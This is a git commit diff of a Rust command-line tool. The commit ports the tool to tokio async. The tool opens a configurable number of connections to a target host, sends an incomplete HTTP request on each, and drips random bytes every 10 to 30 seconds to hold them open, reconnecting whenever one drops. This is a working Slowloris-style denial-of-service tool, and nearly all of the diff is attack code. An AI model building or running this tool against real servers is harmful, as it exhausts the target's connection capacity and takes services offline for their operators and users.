c9b9d0e9e84fceb34c11f93325984d560b78c437
trivernis <trivernis@protonmail.com>
2021-04-14 22:52:30 +0200

    Use tokio for a simplified solution
    Signed-off-by: trivernis <trivernis@protonmail.com>

--- src/main.rs
+++ src/main.rs
@@ -2,14 +2,13 @@
 Copyright (c) 2021 trivernis
 See LICENSE for more information
  */
-use native_tls::TlsConnector;
-use scheduled_thread_pool::ScheduledThreadPool;
-use std::io::Write;
-use std::net::TcpStream;
+use futures::FutureExt;
+use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::Arc;
-use std::thread;
 use std::time::Duration;
 use structopt::StructOpt;
+use tokio::io::AsyncWriteExt;
+use tokio::net::TcpStream;
 
 #[derive(StructOpt, Debug)]
 #[structopt()]
@@ -22,77 +21,65 @@ struct Opt {
     #[structopt(short, long, default_value = "443")]
     pub port: u32,
 
-    /// If the connection should use plain http
-    #[structopt(short, long)]
-    pub http: bool,
-
     /// Number of connections
     #[structopt(short = "n", long, default_value = "200")]
     pub count: usize,
 }
 
-fn main() {
+#[tokio::main(flavor = "current_thread")]
+async fn main() {
     let opts: Opt = Opt::from_args();
-    let pool = Arc::new(scheduled_thread_pool::ScheduledThreadPool::new(
-        num_cpus::get(),
-    ));
 
-    for i in 0..opts.count {
-        let address = opts.address.clone();
-        let port = opts.port;
-        let https = !opts.http;
-
-        keep_alive(Arc::clone(&pool), i, address, port, https);
+    let mut futures = Vec::new();
+    let counter = Arc::new(AtomicUsize::new(0));
+    // create the specified amount of connections
+    for _ in 0..opts.count {
+        futures.push(connect(opts.address.clone(), opts.port, Arc::clone(&counter)).boxed());
     }
-    thread::park();
+    // output some information
+    futures.push(
+        async move {
+            loop {
+                // log current number of connections
+                print!("\r{:0>3} Connections", counter.load(Ordering::Relaxed));
+                tokio::time::sleep(Duration::from_millis(100)).await;
+            }
+        }
+        .boxed(),
+    );
+    // wait forever
+    futures::future::join_all(futures).await;
 }
 
-/// Sends Keep-Alive data to the server
-fn keep_alive(pool: Arc<ScheduledThreadPool>, i: usize, address: String, port: u32, https: bool) {
-    if let Some(mut stream) = create_connection(&*address, port, https) {
-        print!("Connection {} established.                          \r", i);
-        let pool_clone = Arc::clone(&pool);
-
-        pool.execute_at_fixed_rate(
-            Duration::from_secs(fakeit::misc::random(5, 10)),
-            Duration::from_secs(fakeit::misc::random(5, 10)),
-            move || {
-                print!("Sending Keep-Alive-Header for connection {}...\r", i);
-
-                if let Err(e) = stream.write_all(&[fakeit::misc::random(0u8, 255u8)]) {
-                    let address = address.clone();
-                    let pool_clone2 = Arc::clone(&pool_clone);
-                    println!("Connection {} lost: {}. Reestablishing...", i, e);
-
-                    pool_clone.execute(move || {
-                        keep_alive(pool_clone2, i, address, port, https);
-                    });
-                }
-            },
-        );
+/// Connects via HTTP and tries to keep the connection open
+async fn connect(address: String, port: u32, counter: Arc<AtomicUsize>) {
+    loop {
+        if let Some(mut stream) = create_connection(&address, port).await {
+            counter.fetch_add(1, Ordering::Relaxed);
+            // write until writing fails
+            while stream
+                .write_all(&[fakeit::misc::random(0u8, 255u8)])
+                .await
+                .is_ok()
+            {
+                // wait a random amount between 10 and 30 seconds
+                tokio::time::sleep(Duration::from_secs(fakeit::misc::random(10, 30))).await;
+            }
+            counter.fetch_sub(1, Ordering::Relaxed);
+        }
+        // wait to reduce load with constantly failing attempts
+        tokio::time::sleep(Duration::from_millis(10)).await;
     }
 }
 
-/// Creates a single HTTP/S connection
-fn create_connection(
-    address: &str,
-    port: u32,
-    https: bool,
-) -> Option<Box<dyn Write + Send + Sync>> {
-    let tcp_stream = TcpStream::connect(format!("{}:{}", address, port))
-        .map_err(|e| {
-            eprint!("Failed to establish connection: {}", e);
-            e
-        })
+/// Creates a single HTTP connection
+async fn create_connection(address: &str, port: u32) -> Option<TcpStream> {
+    // connect to the specified address
+    let mut stream = TcpStream::connect(format!("{}:{}", address, port))
+        .await
         .ok()?;
 
-    let mut stream: Box<dyn Write + Send + Sync> = if https {
-        let connector = TlsConnector::new().ok()?;
-        let tls_stream = connector.connect(&*address.clone(), tcp_stream).ok()?;
-        Box::new(tls_stream)
-    } else {
-        Box::new(tcp_stream)
-    };
+    // send simple get request and start second header field
     stream
         .write_all(
             format!(
@@ -101,6 +88,7 @@ fn create_connection(
             )
             .as_bytes(),
         )
+        .await
         .ok()?;
 
     Some(stream)
